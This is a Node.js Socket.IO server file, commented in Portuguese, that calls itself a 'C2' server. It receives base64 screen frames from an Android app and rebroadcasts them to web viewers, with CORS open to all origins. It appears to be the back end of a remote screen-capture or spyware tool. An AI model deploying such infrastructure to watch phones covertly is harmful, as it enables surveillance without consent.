// server.js
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const path = require('path'); // <-- Importe o módulo path

const app = express();
app.use(cors());

// --- NOVA LINHA ---
// Serve arquivos estáticos da pasta 'public'
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.send('Servidor C2 ativo. Acesse /viewer.html para visualizar.');
});

const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: '*', // Em produção, restrinja isso ao seu domínio
  }
});

io.on('connection', socket => {
  console.log(`📡 Cliente conectado: ${socket.id}`);

  // --- NOVO OUVINTE ---
  // Recebe os frames de tela do app Android
  socket.on('screen_frame', base64Data => {
  const buffer = Buffer.from(base64Data, 'base64');
  console.log(`🖼️ Frame recebido de ${socket.id} | Tamanho: ${buffer.length} bytes`);

  // Repassa para os visualizadores
  socket.broadcast.emit('screen_frame', base64Data);
});

  socket.on('hora', data => {
    console.log('🕒 Horário recebido:', data);
    io.emit('hora', data);
  });

  socket.on('disconnect', () => {
    console.log(`❌ Cliente desconectado: ${socket.id}`);
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => { // Adicionamos '0.0.0.0' para garantir que ele aceite conexões externas
  console.log(`🚀 Servidor rodando na porta ${PORT}`);
  // Remova o localhost do log para não te confundir
  console.log(`📺 O servidor está online e pronto para receber conexões!`);
});
